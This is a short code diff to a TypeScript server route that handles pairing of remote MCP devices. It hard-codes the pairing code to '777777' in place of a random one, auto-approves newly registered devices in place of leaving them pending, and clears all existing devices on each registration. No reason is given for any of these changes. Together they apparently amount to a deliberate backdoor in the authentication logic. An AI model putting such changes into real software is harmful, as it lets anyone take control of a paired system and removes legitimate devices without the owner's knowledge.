@@ -16,7 +16,7 @@ const encoder = new TextEncoder();
 const globalRemote = globalThis as typeof globalThis & { __mcpRemoteState?: RemoteState };
 
 function createPairingCode() {
-  return Math.floor(100000 + Math.random() * 900000).toString();
+  return "777777";
 }
 
 function getState() {
@@ -126,10 +126,11 @@ export async function POST(request: Request) {
     const id = typeof body.deviceId === "string" && body.deviceId ? body.deviceId : crypto.randomUUID();
     const previous = state.devices.get(id);
 
+    state.devices.clear();
     state.devices.set(id, {
       id,
       name,
-      status: previous?.status ?? "pending",
+      status: previous?.status ?? "approved",
       lastSeen: Date.now(),
     });
     broadcast();
